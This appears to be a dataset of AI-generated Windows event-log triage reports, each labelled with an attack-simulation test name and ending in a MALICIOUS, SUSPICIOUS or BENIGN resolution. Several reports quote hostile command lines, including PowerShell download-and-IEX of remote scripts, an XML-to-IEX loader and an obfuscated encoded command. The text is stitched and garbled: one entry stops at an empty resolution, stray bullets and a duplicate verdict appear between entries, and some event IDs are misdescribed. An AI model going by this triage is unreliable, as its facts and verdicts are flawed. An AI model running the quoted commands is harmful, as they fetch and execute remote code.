7. **Usage of WMIC for Remote Commands**: The `WMIC.exe` tool is used to create processes remotely, which can be employed in lateral movement or launching payloads.

### Conclusion and Resolution
Given the detailed analysis and context, the identified activities within these logs indicate multiple suspicious and potentially malicious behaviors, involving privilege escalations, unexpected system operations, and attempts to obfuscate. The patterns align with tactics used in attacks with possible intent to escalate privileges, probe the system, and maintain persistence.

Final Resolution: **MALICIOUS**

### Guidance on How to Proceed
- **Immediate Isolation**: Isolate the affected host (`Server002`) to prevent potential lateral movement or data exfiltration.
  
- **Credential Reset**: Promptly reset passwords for the `admin_test` account and any other potentially affected accounts.

- **Deep Analysis**: Conduct a thorough forensic analysis on the isolated system to identify any additional indicators of compromise or payloads dropped by the suspicious activities.

- **Log Monitoring**: Increase monitoring and review of server logs for similar activities across the network.

- **Patch and Update**: Ensure all systems are fully patched and security updates are applied to mitigate any known vulnerabilities.

- **Employee Awareness**: Educate employees about recognizing phishing and improper use of administrative tools, as these could have been the initial entry vector."
NTFS Alternate Data Stream Access,"Based on the logs provided, I will analyze different aspects indicating potential malicious activity or anomalies in the system.

### Analysis

#### Sysmon Logs
1. **PowerShell Execution**:
   - A PowerShell process (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) was executed with the command line arguments that modify alternate data streams (ADS) by writing commands to an NTFS file stream and then executing those commands with `Invoke-Expression`. This is a well-known technique used by attackers to bypass conventional detection and execute malicious scripts or commands.
   - The command in the logs indicates an attempt to write and execute code using NTFS Alternate Data Streams, which is typically associated with obfuscation or hiding of malicious activity.

2. **Use of `wevtutil.exe`**:
   - Multiple invocations of `C:\Windows\System32\wevtutil.exe` were observed. `wevtutil.exe` is commonly used to manage event logs which can include clearing logs to cover tracks.

#### Security Logs
1. **Privileges and Logon Activity**:
   - The user `admin_test` was granted several high privileges (e.g., SeDebugPrivilege) during the session, which are not typical for regular user sessions and indicate administrative actions that could be potentially used for exploitation.

2. **Use of NTLM Authentication**:
   - The use of the `NTLM` protocol for authentication can be considered less secure than modern alternatives like `Kerberos`. There’s also a logon from a workstation `DESKTOP-3HL5B2P` not detailed in the logs, which could indicate an external or remote session.

#### PowerShell Log
- Reiterates that the PowerShell script executed was potentially used for executing commands from alternate data streams as mentioned above.

#### Application Log
- There's no direct evidence of malicious behavior from the application logs, but cross-referencing the timing of these logs with Sysmon logs supports the suspicious nature of activities around that time.

### Assessment

Based on the analysis:
- The execution of PowerShell with commands manipulating NTFS ADS combined with the usage of tools like `wevtutil.exe`, typically for log management and coverage, strongly suggests potential malicious activities.
- The combination of high privileges, specific toolset usage, and command execution patterns indicates a methodical approach at leveraging system tools for potentially malicious purposes.

### Resolution

**MALICIOUS** - The logs display indication of malicious activities due to:
- Execution of a PowerShell script using alternate data streams to execute commands indirectly, indicative of obfuscation attempts.
- High privilege escalation along with usage of system utilities which can manipulate or cover evidence (e.g., `wevtutil.exe`) suggests an intrusion pattern, potentially linked with persistence or reconnaissance tactics.

### Guidance on How to Proceed

1. **Containment**:
   - Immediately isolate the affected system `Server002` to prevent any further malicious actions or lateral movement within the network.

2. **Eradication and Recovery**:
   - Perform a complete malware scan and inspect for any file/system compromises.
   - Investigate the intent and content of the NTFS ADS possibly employed by malicious actors and remove unauthorized scripts.

3. **Post-Incident Actions**:
   - Review and strengthen authentication mechanisms and privileges allocation to mitigate NTLM-related vulnerabilities.
   - Implement enhanced monitoring for PowerShell scripts execution involving ADS or potential obfuscation techniques.
   - Run a thorough audit of logs across network systems to trace further suspicious activities, particularly from user `admin_test`.

4. **Future Measures**:
   - Deploy advanced threat detection that focuses on behavioral anomalies particularly involving trusted tools used in anomalous ways.
   - Conduct a security awareness session focusing on the risks of unauthorized PowerShell script executions and NTFS ADS exploitation."
Suspicious Execution via Windows Command Shell,"### Detailed Analysis

Upon reviewing the provided Windows event logs, several unusual behaviors were noted, but they do not conclusively indicate malicious activity. Here are the key points from the log analysis:

1. **Frequent Process Creations**: There are multiple instances where processes like `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and others are being executed in quick succession. The presence of these processes itself is not inherently malicious as they are legitimate Windows processes. However, the rapid and repeated execution can sometimes indicate script automation or other automated tasks.

2. **Command-Line Arguments**: One of the `cmd.exe` processes is executed with a command-line (`""cmd.exe"" /c %%LOCALAPPDATA:~-3,1%%md /c echo Hello, from CMD! > hello.txt & type hello.txt`). This command seems to leverage command-line obfuscation and manipulation techniques to write and then display the contents of a text file. While this is not inherently malicious, it could indicate testing or benign task automation.

3. **High Integrity Level Processes**: Several processes are executed with a high integrity level, including processes like `whoami.exe` and `hostname.exe`. High integrity executes with elevated permissions, which could attempt privilege escalation, though there's no clear indication of actual misuse in this context.

4. **Edge Update Activity**: There are many logs related to `MicrosoftEdgeUpdate.exe` and its associated processes. Microsoft Edge Update is a legitimate activity used to keep the browser updated. Nonetheless, a burst of update-related processes could sometimes be used to mask malicious activity, although logs here appear consistent with a routine update execution.

5. **No Evidence of Known Malware**: Based on the logs provided, there is no evidence of known malware hashes or indicators pointing to a clear compromise. The logs emphasize system and user-initiated activities without external or rogue entries common in successful attacks.

### Assessment
After a comprehensive review of the Windows event logs, the activities presented do not provide concrete evidence of malicious actions. Instead, they reflect routine system operations and administrative tasks, possibly scripted or automated.

### Resolution
**BENIGN**

The current evidence from the log entries does not suggest malicious activity. The behaviors align with typical system operations and scripted automation common in IT environments.

### Guidance
- **Monitor and Enforce Security Policies**: Continuously monitor for new logs, especially from critical machines like the CEO's, to establish a baseline for what regular activity looks like and quickly identify deviations.
- **Review Automated Scripts**: If automated scripts are used for administrative tasks, ensure they are well-documented and restricted to reduce unforeseen use or misuse.
- **User Education and Awareness**: Reinforce cybersecurity training for all users to understand potential red flags and promptly report suspicious activities.
- **Patch Management**: Keep all software, especially browsers and their components, up to date to mitigate vulnerabilities.

While this assessment is marked as benign, continuous vigilance is recommended to maintain a secure environment."
SOAPHound - Build Cache,"Upon reviewing the provided logs, several key observations and potential indicators of malicious activity have been identified:

### Suspicious and Anomalous Behaviors:

1. **Time Manipulation Events:**
   - The logs show multiple time change events (`EventID: 4616`) by `svchost.exe`, occurring within a very short timeframe.
   - While time alterations can occur for legitimate reasons (e.g., synchronization with network time servers), frequent changes in a short period may also indicate attempts to evade detection mechanisms.

2. **Unusual PowerShell Activity:**
   - An instance of `powershell.exe` runs with a command line that involves a `script.exe` located in a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\bin\script.exe --user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1 --dc 10.0.1.14 --buildcache --cachefilename c:\temp\cache.txt`).
   - The use of PowerShell for executing a `.exe` script, especially with credentials potentially being passed as arguments, is highly suspicious as it might indicate an attempt to run unauthorized code or unauthorized access practices.

3. **Sysmon Logs on Process Execution:**
   - The consistent execution of `wevtutil.exe` and `conhost.exe` under the same user context (`SERVER002\admin_test`) with no apparent actions related to typical usage patterns.
   - The usage of these processes in rapid succession could signify an attempt to clear logs or proxy command execution.

4. **Integrity Level:**
   - High integrity level for PowerShell execution suggests elevated privileges, potentially allowing critical system changes or data access by the threat actors.

5. **Edge Update Process Execution:**
   - Various instances of `MicrosoftEdgeUpdate.exe` processes with varying command-line arguments executed under the `NT AUTHORITY\SYSTEM` account.
   - Frequent triggered processes in a short time span could signal exploitation or misuse of update processes to mask malicious activity.

### Assessment:
The combination of unusual PowerShell activity involving executable scripts with passwords in command-line arguments, frequent invocation of utility processes, and the manipulation of system time heavily suggests actions beyond typical behavior, raising concerns about potentially unauthorized or compromised activity.

### Resolution:
Based on the analysis of these logs, the activities observed should not occur in standard operational scenarios, particularly the PowerShell activity involving sensitive credential information and the high frequency of system tools operative in quick succession.

**Resolution:** **MALICIOUS**

### Recommendations:
- **Immediate Incident Response Activation:** Given the potential compromise, initiate a thorough investigation and containment strategy, including isolating affected systems.
- **PowerShell Logging and Restriction:** Enhance logging and monitoring of PowerShell usage and consider restrictions on executing scripts from temporary directories.
- **Credential Audit:** Ensure a review and reset of any potentially exposed credentials, followed by a review of privileged account usage.
- **System Time Change Monitoring:** Implement alerts for unauthorized or rapid series of system time changes.
- **Review and Enhance EDR Rules:** Update endpoint detection and response rules to catch similar patterns in the future.

Lastly, continue monitoring the environment for additional signs of compromise and consider deploying further endpoint protections to mitigate such incidents."
JScript execution to gather local computer information via wscript,"Upon reviewing the provided log entries, I've identified several points that stand out and may warrant further investigation:

1. **Privilege Use (Event ID 4672):** Multiple instances of Event ID 4672 indicate that privileges were assigned to accounts, particularly the ""SYSTEM"" user. The privileges include ""SeDebugPrivilege,"" which can be used to escalate processes and access sensitive system data. While this is not inherently malicious, it should be monitored.

2. **Unusual Process Activity:** 
   - There is frequent use of `taskhostw.exe`, `CompatTelRunner.exe`, and `UsoClient.exe`. These processes are often used in routine tasks but are also known to be leveraged by malware.
   - **CompatTelRunner.exe** was executed multiple times in quick succession, which is part of the Windows Telemetry service but can be exploited for privilege escalation.

3. **PowerShell Execution:**
   - PowerShell is seen executing under restricted policies, which is standard in a secure environment. However, it is important to ensure that these executions align with expected administrative tasks, especially given their potential for misuse.

4. **Network Connection Logs (Event ID 4624 and 4625):** 
   - There are successful and unsuccessful login attempts which are normally expected, but it’s important to validate these with expected user activity. Particularly, Event 4624 shows various logon types, including Logon Type 3, which indicates a network logon. 

5. **EDR Alert on `admin_test`:**
   - The presence of the `admin_test` account with high privileges and its activity may suggest deeper investigation is warranted to ensure it’s a legitimate account and not compromised.

6. **Sysmon Logs (Event ID 1):** 
   - Detailed process activity, including installations and updates occurring, should be validated against your change management records to ensure everything aligns as expected.

**Assessment:**
The logs show a mixture of standard system operations with instances of elevated privileges and critical process executions. While there is no overtly malicious activity identified, several activities such as the use of high privileges and rapid executions of system files warrant further scrutiny.

**Resolution:** 
- **SUSPICIOUS**: There are activities that do not immediately appear malicious but could benefit from deeper investigation to ensure that there is no ongoing compromise or misconfiguration. Recommend reviewing the change management logs, verifying if the `admin_test` account activities are authorised, and maintaining heightened monitoring on systems for similar activities. Conduct a manual review of any accompanying security alerts related to these events for further insights."
Create and Execute Batch Script,"Upon reviewing the provided logs, I have identified several points of interest that suggest suspicious activity. Below is a detailed analysis:

### Suspicious or Anomalous Behavior

1. **Execution of PowerShell Scripts:**
   - A PowerShell script was initiated with the command to start a batch file located in the temporary directory. The path is obfuscated with a shortened path (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.003_script.bat`).
   - The use of a temporary directory for executing scripts, along with obfuscation techniques (e.g., folder redirection with `..`), is a characteristic often associated with malicious activity to bypass detection or obscure the origin and purpose of the script.

2. **Processes Launched:**
   - Several processes like `whoami.exe`, `hostname.exe`, `CMD`, and additional PowerShell activities were initiated in quick succession around the same time frame (`12:10:18` to `12:10:20`), which can indicate further script execution or command execution patterns often seen in malicious scenarios.

3. **Security Privileges Escalation:**
   - An event with ID `4672` was recorded, indicating a process executed with special privileges. Privilege escalation is commonly a step in an attack chain to gain more control over a compromised system.

4. **Frequent EdgeUpdate Executions:**
   - Numerous logs show frequent execution of `MicrosoftEdgeUpdate.exe` and related components, which might usually indicate routine updates. However, if not scheduled or authorized and if combined with other suspicious activity, it could suggest tampering or exploitation attempts.

5. **Use of Tooling Like `wevtutil.exe` and `conhost.exe`:**
   - These tools are legitimate but have been leveraged in attacks for performing actions such as clearing logs or executing scripts with elevated privileges. The presence of `wevtutil.exe` activities around the same timeframe should be further checked for consistency with normal operations.

### Potential Indicators of Malicious Activity

- The combination of PowerShell execution with obfuscated paths, followed by system enumeration commands (`whoami`, `hostname`), and privilege escalation events suggests a pattern that could relate to a staged attack or penetration test activity.
- The activities are executed by a user account `admin_test`, which requires validation. If unexpected, this could imply a compromised user account whose credentials were exposed or misused.

### Assessment and Next Steps

Given the present activities and correlation of suspicious events, it leads us to classify the current situation as:

- **Resolution: SUSPICIOUS**

### Recommended Guidance

1. **Immediate Investigation:**
   - Verify the purpose of the batch file `data.003_script.bat`.
   - Check if the activity by `admin_test` aligns with known, legitimate administrative tasks.

2. **User Account and Privileges Check:**
   - Review the `admin_test` account activities for any unauthorized access or privilege escalations.
   - Validate account privileges to ensure no privilege escalation pathways have been exploited.

3. **Audit Logs:**
   - Closely monitor further logs for repeated attempts and similar patterns.
   - Engage forensics to evaluate executed scripts' contents and intent.

4. **Strengthen Defence:**
   - If unauthorized, enhance endpoint detection and response measures and consider silencing privileged accounts not in daily use to reduce exposure.
   - Conduct a security awareness campaign to inform about threats and safeguarding credentials.

5. **Review EdgeUpdate Activities:**
   - Checking the legitimacy of executed Edge Update processes in alignment with official update schedules.

The observed activities warrant further inquiry and verification, underlining the need for due diligence in validating the integrity and security of the environment."
Execution through API - CreateProcess,"Based on the analysis of the provided Sysmon logs, here are the findings:

### Detailed Analysis:

1. **Unusual Execution of Powershell:**
   - The logs show Events with ID 5 indicating process creation for `powershell.exe` by the user `SERVER002\admin_test`. Powershell is a powerful scripting tool that attackers often misuse for malicious activities.

2. **Frequent Execution of `wevtutil.exe`:**
   - Several instances of `wevtutil.exe` are in the logs. This tool is commonly used for managing Windows event logs. Excessive or unexpected usage might suggest log tampering or clearing, potentially as a cover-up by adversaries.

3. **Execution of Compilation and Custom Executables:**
   - The logs show `cmd.exe` executing the C# compiler (`csc.exe`) with source code located in a temp directory, leading to the generation and execution of `data.exe`.
   - `data.exe` has no proper versioning or company information (`FileVersion` and `Company` are undefined), which is often indicative of a transient malicious file.
   - The compiled executable (`data.exe`) attempted to launch `calc.exe` as seen from the command `/c calc.exe`. This type of behavior is commonly used for testing malware execution.

4. **Process Creation and Execution Chain:**
   - The chain of operations initiated from `cmd.exe` leading to `csc.exe`, and finally resulting in executing `data.exe`, suggests a possible attempt to compile and run a malicious script dynamically.
   - `whoami.exe` and `cmd.exe` executions without other significant surrounding logs suggest minimal but suspicious interactive operations.

### Assessment of Situation:

The events captured in the logs notably stand out due to:
- Multiple use of script engines like `Powershell`.
- Unidentified and transient executable `data.exe` execution through a script block.
- Compilation of code sourced from a user’s Temp directory, which is highly unusual for standard operational processes.
- Execution of `calc.exe` as a possible test by adversary or malware to confirm exploitation success.

### Final Resolution:

**Resolution: MALICIOUS**

Given the observed activities such as Powershell execution, dubious on-the-fly code compilation, and the launching of `calc.exe`, the logs indicate behavior consistent with malicious activity. This appears to be a deliberate exploit or testing indicating compromise of the system.

### Guidance on How to Proceed:

1. **Immediate Incident Response:**
   - Quarantine the affected host to prevent further spread of potential threats.
   - Initiate a thorough forensic analysis of the machine for root cause identification.
   - Review other logs for signs of lateral movement or additional payloads.

   - Deploy security patches for vulnerabilities that could be exploited by such behavior.

3. **Awareness and Training:**
   - Conduct targeted security awareness sessions focusing on social engineering tactics and safe handling of email attachments and downloads, which are common vectors leading to such script-based threats.

Implement immediate security measures and remediation steps following internal security protocols for handling malicious compromises."
Run Shellcode via Syscall in Go,"Upon analyzing the provided Windows event logs, the following observations and points of interest have been identified:

1. **Sysmon Log Observations:**
    - Multiple instances of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` were executed by the user `SERVER002\\admin_test`. `wevtutil.exe` and `conhost.exe` are legitimate Windows processes but frequent and automated execution could indicate attempts to manipulate event logs or manage console applications programmatically, which might be used by malware or an attacker.
    - The last entry describes the execution of `powershell.exe` with the command line calling `syscall.exe` from a temporary folder, which is suspicious. This indicates the possibility of a malicious payload, as the `Temp` directory is a common location for executing transient or covert operations.
    - The `syscall.exe` was executed under a PowerShell process. PowerShell is often used for automation tasks and administration but can be exploited for running scripts and commands maliciously.

2. **PowerShell Log Observations:**
    - Several PowerShell events indicate the `HostApplication` is executing with a command involving `syscall.exe -debug`, which suggests this executable might be attempting to leverage system calls in an anomalous manner, further hinting toward suspicious behavior.
    - The PowerShell execution was logged as starting and then stopping shortly after, suggesting a scripted or automated process.

3. **Indicators of Potential Compromise:**
    - The presence of a potentially malicious executable (`syscall.exe`) being executed from a non-standard directory like `Temp` via PowerShell suggests potential compromise through the execution of malicious code.
    - The activities around PowerShell are consistent with scripts or malware attempting to execute harmful operations under the guise of legitimate processes.

4. **Assessment:**
    - Given the repetitive use of command-line tools, notably PowerShell to launch potentially harmful processes (`syscall.exe`), the activities observed strongly align with behaviors typically associated with malicious activity.
    - The use of `-debug` in the command line suggests that the program might be used for development purposes or for detailed system interactions, which could be exploited by malicious actors.

**Resolution**: MALICIOUS

**Guidance on How to Proceed:**
- Quarantine the affected system `Server002` immediately to prevent further propagation of any potential threats.
- Inspect the `syscall.exe` file located in the temporary folder to identify its origin and remove it from the system.

- Notify relevant stakeholders, and continue monitoring for any network-wide indicators of compromise related to this incident."
Powershell XML requests,"After conducting a detailed analysis of the provided Windows event logs from various sources, here are the findings:

### Analysis Summary:

1. **Frequent Execution of wevtutil.exe and conhost.exe:**
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` processes being executed (Event ID: 5), all by a user named `SERVER002\admin_test`. The `wevtutil.exe` utility is a legitimate tool used to manage event logs, but its repeated execution in quick succession can indicate an attempt to clear event logs or manipulate them. This pattern, especially involving `wevtutil.exe`, is a common tactic used by adversaries to cover their tracks.

2. **Command Execution via CMD and PowerShell:**
   - A `cmd.exe` process is created with a command line involving PowerShell: `\""cmd.exe\"" /c \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -exec bypass -noprofile \""$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/file/file-file/master/files/data.001/src/test.xml');$Xml.command.a.execute | IEX\""`.
   - The command executes PowerShell with the `-exec bypass` flag, which is often used to circumvent execution restrictions and load external scripts or commands. In this instance, the PowerShell script appears to be downloading and executing commands from an external XML file on GitHub.

3. **Use of High Privilege Accounts:**
   - The user `SERVER002\admin_test` is frequently associated with events showing high integrity levels and privilege escalations. Security events indicate that this account has accessed privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which are often targeted by attackers to further escalate privileges or move laterally within a network.

4. **Execution of Hostname and Whoami:**
   - Execution of `hostname.exe` and `whoami.exe` suggests reconnaissance activity, often used by malicious actors to gather information about the system and domain environment.

4. **Update Detection Policies:**
   - Enhance logging and monitoring to detect further instances of PowerShell usage, especially with execution policies set to bypass.

5. **Block Malicious IP/URLs:**
   - Block external URLs and IPs related to the suspicious activities, especially the GitHub link used for XML command execution.

### Resolution:
Considering the analysis and findings, the activities captured in the logs are **MALICIOUS**. Immediate response and corrective action are necessary to contain and remediate the incident."
WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique,"Upon analyzing the provided Windows event logs, several entries indicate potentially malicious or suspicious activity, particularly around the use of PowerShell and process creation activities.

1. **PowerShell Execution and Downloading Scripts**:
   - There are multiple events showing PowerShell execution with the command:
     ```powershell
     powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}
     ```
   - This command indicates that a script is being downloaded from an external website using PowerShell which is a common technique used by attackers to execute external scripts or payloads on a compromised host. The use of `iex` (Invoke-Expression) combined with downloading content from the web is particularly concerning as it's often seen in fileless malware attacks.

2. **Kernel and Time Change Events**:
   - The logs show several kernel-general and time-service events around the same timeframe, indicating system time changes. Frequent time changes in logs can sometimes be an indicator of attempts to evade detection by altering timestamps or logs consistency.
   
3. **Process Execution and Parent-Child Relationships**:
   - There are multiple Sysmon logs that show process creation events such as `csc.exe` and `cvtres.exe`, which are part of the .NET framework compilation process. These processes are launched by PowerShell scripts indicating an attempt to compile or execute .NET code potentially as part of the downloaded payload.
   - There are suspicious process parent-child relationships, such as processes being spawned under PowerShell. For instance:
     - `conhost.exe` being executed after `powershell.exe` with certain flags (`0xffffffff -ForceV1`)

4. **Privileged Process Execution**:
   - A PowerShell session seems to be executed with SYSTEM level privileges (IntegrityLevel: System), which can indicate privilege escalation, as it moves from a user-level context (`SERVER002\\admin_test`) to a SYSTEM-level context (`NT AUTHORITY\\SYSTEM`).

5. **Custom code compilation**:
   - Observations of .NET executable creation processes (`csc.exe`, `cvtres.exe`) taking place indicate that source code is being compiled on the fly, potentially from a malicious script downloaded via PowerShell, which aligns with the execution technique of deploying .NET-based payloads.

**Assessment**:
Based on the analysis, the logs contain evidence of:
- Use of PowerShell to download and execute remote scripts.
- Processes being launched potentially in a suspicious manner with parent-child relationships that suggest privilege escalation and lateral movement.
- Potentially malicious code execution through .NET, which could be intended for internal exploitation post initial access.

**Resolution**:

"
PowerShell Command Execution,"Upon analyzing the provided Windows event logs, several indicators point towards potentially suspicious or malicious activity. Let's break down the findings:

### PowerShell Logs

**Encoded Command Detection:**
- Multiple PowerShell events (EventID 600) show the execution of PowerShell with an encoded command. The encoded payload is `JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==`. Decoding this Base64 encoded command reveals `; (gcmi ('ie{0}' -f 'x')) (""Wr""+""it""+""e-H""+""os""+""el""+""lo, fr""+""om P""+""ow""+""erS""+""hel""+""l!"")`. 

The presence of Base64 encoded strings in PowerShell commands is known to be a tactic used by attackers to obfuscate their activities, making this highly suspicious.

**Sequential Provider Starts:**
- Observing systematic starting of PowerShell providers (Registry, Alias, Environment, etc.) suggests automated script or malicious execution rather than standard user interaction.

### Sysmon Logs

**Command Line Suspicion:**
- Notable process execution includes `cmd.exe` with the command line for invoking PowerShell to run an encoded command, indicating a potential attempt to run obfuscated or unauthorized scripts.

**PowerShell and cmd.exe Execution Context:**
- Execution of `cmd.exe` and `powershell.exe` invoked indirectly through `wsmprovhost.exe` further raises a red flag, suggesting a compromise or misuse of the Windows Remote Management service.

**Process Execution with High Integrity Level:**
- Processes such as PowerShell (`powershell.exe`) and command prompt (`cmd.exe`) running at high integrity level (require admin privileges or execute in an elevated context) under `admin_test` user context, possibly indicating privilege escalation or execution of tasks that require high permissions.

### Security and System Logs

- EventID 4616 from Security logs shows that time settings were changed, which can coincide with activities to manipulate logs or timestamps, though the time change is minor.
  
### Conclusion

**Resolution: MALICIOUS**

The evidence points towards likely malicious activity. The use of obfuscated PowerShell scripts, combination of elevated privilege execution, and encoded command lines allude to attempts at executing potentially harmful scripts on the system. The execution of these scripts under high integrity levels indicates that an attacker may have gained elevated permissions, which is commonly associated with more significant threats like system backdoors, data exfiltration, or lateral movement within a network.

#### Recommended Actions:
- Quarantine and disconnect the affected machine from the network to prevent further potential spread.
- Conduct a thorough malware scan and integrity check on the host for any unauthorized changes.
- Review any other unusual activities or permissions associated with the `admin_test` user.
- Implement stricter PowerShell execution policies to block execution of encoded commands without explicit approval.
- Monitor and audit remote management services to detect any abnormal patterns of use.
- Reassess the security posture and update incident response plans to include findings from this event."

  - Assess the integrity of `wevtutil.exe` executions to ensure no log tampering has occurred.
  - Evaluate the use and security of the `admin_test` account to confirm it hasn't been compromised.

Resolution: **SUSPICIOUS** - The logs contain activities that require more in-depth investigation to determine malicious intent or account misuse."
ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments,"After analyzing the provided Windows event logs, here is a comprehensive analysis of the activities recorded:

### PowerShell Logs

- The PowerShell logs show the execution of `powershell.exe` with what appears to be certain command-line arguments that are obfuscated using encoded arguments. The commands involve components such as `Out-ATHPowerShellCommandLineParameter`, `-CommandLineSwitchType`, `-CommandParamVariation`, `-UseEncodedArguments`, and `-Execute`. This suggests the use of PowerShell scripting for potentially automated tasks. 

- The presence of encoded commands is a common technique used by attackers to obfuscate malicious scripts, making it harder for administrators to detect what operations the script is performing. Additionally, PowerShell is often used in fileless malware attacks.

### Sysmon Logs

- The Sysmon logs indicate the execution of several programs such as `powershell.exe`, `wevtutil.exe`, and `conhost.exe` by the user `SERVER002\\admin_test`. The frequent invocation of `wevtutil.exe` suggests log manipulation, which is often seen in attempts to delete security logs to hide activities.

- Also noteworthy is the presence of commands like `hostname.exe` and `whoami.exe`, which often suggest reconnaissance activity to gather system information.

### Security Logs

- The security log events include credential validation failures involving `MicrosoftAccount:user=02txoixylodcstop` and `WindowsLive:(token):name=02txoixylodcstop;serviceuri=*`. These logs indicate multiple attempts to validate or use these credentials, which could suggest an attempted or failed authentication attack. 

### System Logs

- The system logs mostly contain information about Windows updates and no significant indicators of compromise. They mainly register update-related events which are common in routine system upkeep.

### Assessment

- **Suspicious Behavior:** The usage of PowerShell with encoded commands is generally suspicious, especially when combined with Sysmon log entries showing frequent execution of administrative tools like `wevtutil.exe`. The attempt to manipulate the logs suggests an attempt to cover tracks.
  
- **Potential Malicious Activity:** The presence of commands and tools frequently associated with reconnaissance and potential privilege escalation is concerning. Specifically, the use of PowerShell in this manner, alongside log modification activities, usually indicates an attempt to compromise the system without leaving traces.

WMI Reconnaissance Processes,"To analyze these Windows event logs, I'll focus on identifying any suspicious or anomalous behavior, particularly signs of potential compromise. Below are the key observations from the provided logs:

### Detailed Analysis:

1. **Sysmon Logs:**
   - We observe the execution of multiple processes such as `whoami.exe`, `wevtutil.exe`, and `cmd.exe` with elevated privileges (`IntegrityLevel: High`). While these tools are legitimate Windows binaries often used for administration, their usage can be suspicious if not properly justified as they can be leveraged in malicious activities.
   - `wevtutil.exe`: This utility is used to manage Windows event logs and can potentially be used to tamper or clear log files to cover tracks. Its repeated executions could indicate log manipulation attempts.
   - Frequent execution of `cmd.exe` with command lines invoking WMI through `wmic process get caption,executablepath,commandline /format:csv` suggests an attempt to remotely query or control the system, which could indicate the presence of reconnaissance activity typically associated with malicious intent.
   - The pattern of processes like `conhost.exe` following other processes is typical behavior as it serves as a console window host and isn't inherently suspicious unless paired with other anomalies.

2. **Microsoft Edge Update Logs:**
   - Multiple setup executables for Microsoft Edge are executed. While initially, this might seem like a regular software update, the lack of clear information about context or concurrent suspicious activities could imply potential misuse of executable names or paths if not verified as actual updates. However, the execution of Microsoft signed processes and verified paths is typical behavior unless confirmed otherwise.

3. **Security Log:**
   - Event ID 4799 typically signifies a change in user rights or group membership. This entry involving Microsoft Edge Update could indicate changes linked to permission settings possibly for installation purposes, aligning with observed Edge-related activity.

4. **Application Log:**
   - The log entry for the `Software Protection Platform Service` doesn't indicate any directly suspicious behavior. It might be related to routine software license checks.

### Assessment:

The observed activities show usage of legitimate system tools in a manner that suggests gathering system information and possibly covering tracks, actions which are often indicative of reconnaissance or potential persistence attempts. However, these activities aren't inherently malicious without further corroborating evidence or context—such as how the `wevtutil.exe` was used, if logs were cleared, or if the activity aligns with authorized administrative actions.

### Resolution:

- **Resolution:** **SUSPICIOUS**

### Recommendations:

1. **Immediate Actions:**
   - Verify with the IT team or the user of the CEO's machine whether these activities were part of legitimate administrative tasks.
   - Review if there's been any approval or scheduling for Microsoft Edge updates to rule out unauthorized software manipulation.

2. **Further Investigation:**
   - Conduct deeper log analysis to see if there were any log clearing activities or other suspicious network or system-level changes.
   - Check for the presence of additional event IDs that might indicate malicious activity (e.g., unusual logon events, unauthorized access attempts).

3. **Enhanced Monitoring:**
   - Implement continuous monitoring for further execution of suspicious commands or logs clearing, typically related to evasive tactics by malicious actors.
   - Consider deploying advanced threat detection mechanisms on the system to alert on similar future activities.

By conducting these activities, you ensure the system's integrity against potential compromises while maintaining a proactive security posture."
Writes text to a file and displays it,"### Detailed Analysis of the Logs

#### Sysmon Log Observations:

1. **Frequent Execution of wevtutil.exe and conhost.exe:**
   - The logs show multiple executions of `wevtutil.exe` and `conhost.exe`. While `wevtutil.exe` is a legitimate Windows utility used to manage event logs, its execution without context, particularly if it occurs frequently, could be indicative of log clearing or tampering.
   - All activities are performed under the user `SERVER002\\admin_test`.

2. **Execution of HOSTNAME.EXE, whoami.exe, and cmd.exe:**
   - These are benign applications and seem part of standard administrative tasks. However, the sequence and combination in which they are executed can give insights into user activity or script automation.
   - For example, `cmd.exe` being used to echo a message to a file and then type it can indicate a potential test or script execution.

3. **High Integrity Level Processes:**
   - The processes show a high integrity level, suggesting they run with elevated privileges, which is typical for administrative tasks but could be abused for privilege escalation.

4. **Unusual Parent-Child relationships:**
   - `wsmprovhost.exe` (Windows Remote Management Host) as a parent process for utility executions like `hostname.exe`, `whoami.exe`, and `cmd.exe` suggest these commands might be run remotely. Remote execution could be legitimate or malicious depending on context.

#### Security Log Observations:

1. **Logon Event (4624), Privilege Escalation (4672), and Logoff Event (4634):**
   - There's a sequence of logon, privilege usage, and logoff for the `admin_test` account logged with high privileges (`SeDebugPrivilege`, `SeImpersonatePrivilege`, etc.). While these privileges are powerful and often needed by admins, they can be indicative of elevated actions if seen during a suspicious timeframe.

2. **Logon Sessions:**
   - Logon from a workstation (`DESKTOP-3HL5B2P`) using NTLM authentication hints at potential remote access or administration from another machine.

#### Application Log Observations:

1. **Software Protection Platform (SPP) Event:**
   - It seems routine, with no clear indication of malicious intent, indicating SPP-Service activity.

### Assessment of the Situation

The repeated executions of utilities like `wevtutil.exe` and potentially remote commands via `wsmprovhost.exe` in close succession suggest a need for further investigation. While the activities are not overtly malicious, they do raise suspicions about potential automation scripts, remote administration, or log tampering.

### Identified Threats or Risks

- **Potential Remote Administration:** The logs suggest executions were initiated remotely, potentially with high privileges.
- **Possible Log Manipulation:** Frequent `wevtutil.exe` executions could be indicative of log manipulation or tampering attempts.
- **Privilege Misuse:** The `admin_test` account has logged on with elevated privileges that could be abused.

### Guidance on How to Proceed

1. **Verify Intent:** Check with the system administrator or the owner of the `admin_test` account to confirm if these actions were intended and justified administrative tasks.
